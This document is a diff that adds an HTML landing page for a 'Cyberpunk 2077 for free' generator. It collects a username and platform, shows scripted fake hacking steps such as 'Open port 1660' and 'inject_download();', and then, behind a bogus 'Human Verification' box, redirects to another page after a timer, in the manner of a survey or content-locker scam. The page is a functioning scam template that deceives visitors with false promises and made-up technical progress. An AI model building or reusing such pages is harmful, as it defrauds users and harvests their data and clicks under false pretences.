@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- 
+
+
+
+ -->
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyberpunk 2077</title>
+    <link rel="stylesheet" href="style.min.css">
+</head>
+
+<body>
+    <div class="header">
+        <div class="logo">
+            <div class="logo-img">
+                <picture>
+                    <source srcset="./img/logo.webp" type="image/webp">
+                    <source srcset="./img/logo.png" type="image/png">
+                    <img src="./img/logo.png" alt="logo">
+                </picture>
+            </div>
+        </div>
+    </div>
+    <main>
+        <div class="welcome">
+            <div class="character-img">
+                <picture>
+                    <source srcset="./img/character.webp" type="image/webp">
+                    <source srcset="./img/character.png" type="image/png">
+                    <img src="./img/character.png" alt="character">
+                </picture>
+            </div>
+            <div class="title">
+                <h1 class="title-text">CYBERPUNK 2077</h1>
+                <h2 class="title-text">FOR FREE</h2>
+            </div>
+            <div class="container">
+                <div class="platform step1 show" id="step1">
+                    <h3 class="mid-text">What platform?</h3>
+                    <div class="choose">
+                        <div class="input-cont">
+                            <input type="text" class="input" placeholder="Enter username" id="username">
+                            <p class="error" id="username-error">Please enter username</p>
+                        </div>
+                        <div class="single-element choose-platform active">
+                            <picture>
+                                <source srcset="./img/stream-icon.webp" type="image/webp">
+                                <source srcset="./img/stream-icon.png" type="image/png">
+                                <img src="./img/stream-icon.png" alt="stream-icon">
+                            </picture>
+                        </div>
+                        <div class="single-element choose-platform">
+                            <picture>
+                                <source srcset="./img/ps-icon.webp" type="image/webp">
+                                <source srcset="./img/ps-icon.png" type="image/png">
+                                <img src="./img/ps-icon.png" alt="ps-icon">
+                            </picture>
+                        </div>
+                        <div class="single-element choose-platform">
+                            <picture>
+                                <source srcset="./img/xbox-icon.webp" type="image/webp">
+                                <source srcset="./img/xbox-icon.png" type="image/png">
+                                <img src="./img/xbox-icon.png" alt="xbox-icon">
+                            </picture>
+                        </div>
+                        <div class="switch">
+                            <p class="small-text">Enable Encryption</p>
+                            <div class="onoffswitch">
+                                <input type="checkbox" name="onoffswitch" class="onoffswitch-checkbox"
+                                    id="myonoffswitch" tabindex="0" checked>
+                                <label class="onoffswitch-label" for="myonoffswitch">
+                                    <span class="onoffswitch-inner"></span>
+                                    <span class="onoffswitch-switch"></span>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                    <a href="javascript:void(0)" class="btn primary" id="connect-btn">Connect</a>
+                </div>
+                <div class="platform step2" id="step2">
+                    <h3 class="mid-text">Processing_</h3>
+                    <div class="processing-box">
+                        <p class="process-text">> Connect to your account</p>
+                        <p class="process-text hide">> Open port 1660</p>
+                        <p class="process-text hide">> Adding Cyberpunk 2077 to your account</p>
+                        <p class="process-text hide">> Ready</p>
+                        <p class="process-text hide">> Performing User authentication…</p>
+                        <p class="process-text hide">> Encrypting communication with server: 256bit_Packet_Encryption();</p>
+                        <p class="process-text hide">> Retrieving current server script: read_source_server_source();</p>
+                        <p class="process-text hide">> Generating Cyberpunkt_2077_file: inject_download();</p>
+                        <p class="process-text hide">> Downloading… </p>
+                    </div>
+                    <div class="progress">
+                        <div class="progress-value"></div>
+                    </div>
+                </div>
+                <div class="platform step3" id="step3">
+                    <div class="done-img">
+                        <picture>
+                            <source srcset="./img/check-icon.webp" type="image/webp">
+                            <source srcset="./img/check-icon.png" type="image/png">
+                            <img src="./img/check-icon.png" alt="check-icon">
+                        </picture>
+                    </div>
+                    <h3 class="mid-text">Human Verification</h3>
+                    <h3 class="mid-text small">Wait a moment ... </h3>
+                    <div class="locker" id="locker">
+						<!--  -->
+                        <script>
+                            const transfer = () => {
+                            window.location.href = "iframe.html";
+                            };
+                            const timer = setTimeout(transfer, 35000);
+                        </script>
+                    </div>  
+                </div>
+            </div>
+        </div>
+        <div class="bottom step1" id="bottom">
+            <div class="container">
+                <div class="recent-activity-container">
+                    <div class="recent-title">
+                        <h3 class="large-text">Recent</h3>
+                        <h3 class="large-text">activity</h3>
+                    </div>
+                    <div class="activity" id='activity'>
+
+                        <div id="last"> 
+                        </div>
+                    </div>
+                </div>
+                <div class="divider">
+                    <div class="line bold"></div>
+                    <div class="logo-img">
+                        <picture>
+                            <source srcset="./img/logo.webp" type="image/webp">
+                            <source srcset="./img/logo.png" type="image/png">
+                            <img src="./img/logo.png" alt="top background">
+                        </picture>
+                    </div>
+                    <div class="line"></div>
+                </div>
+                <div class="info">
+                    <p class="small-text">Cyberpunk 2077 is an upcoming action role-playing video game developed and
+                        published by CD Projekt. It is scheduled to be released for Microsoft Windows, PlayStation 4,
+                        PlayStation 5, Stadia, Xbox One, and Xbox Series X/S on 10 December 2020. Adapted from the
+                        Cyberpunk franchise, the story takes place in dystopian Night City, an open world with six
+                        distinct regions. Players assume the first-person perspective of a customisable mercenary known
+                        as V, who can acquire skills in hacking and machinery, an arsenal of ranged weapons, and options
+                        for melee combat.</p>
+                    <br><br>
+                    <p class="small-text"> Cyberpunk 2077 was developed using the REDengine 4 by a team of around 500,
+                        exceeding the number that worked on the studio's previous game The Witcher 3: Wild Hunt (2015).
+                        CD Projekt launched a new division in Wrocław, Poland, and partnered with Digital Scapes,
+                        Nvidia, QLOC, and Jali Research to aid the production. Cyberpunk creator Mike Pondsmith was a
+                        consultant, and actor Keanu Reeves has a starring role. The original score was led by Marcin
+                        Przybyłowicz, featuring the contributions of several licensed artists. This page is not related 
+                        to the creations of Cyberpunkt 2077 and is not authored by CDPR.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </main>
+
+
+    <script src="./js/script.js"></script>
+    <script src="./js/activity.js"></script>
+    <script src="./js/steps.js"></script>
+</body>
+
+</html>
